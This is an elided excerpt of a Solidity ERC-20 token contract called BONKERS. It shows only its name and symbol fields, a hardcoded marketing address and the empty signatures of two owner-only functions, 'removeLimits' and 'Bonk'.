...
contract BONKERS is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "BONKERS";
    string public _symbol= "BONKERS";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0x8f375F861a5C86DC5E1bC4696ABC5f9EB8E82E89);
    ...
    function removeLimits(address[] memory recipients_) onlyOwner public {
    ...
    function Bonk() onlyOwner public {
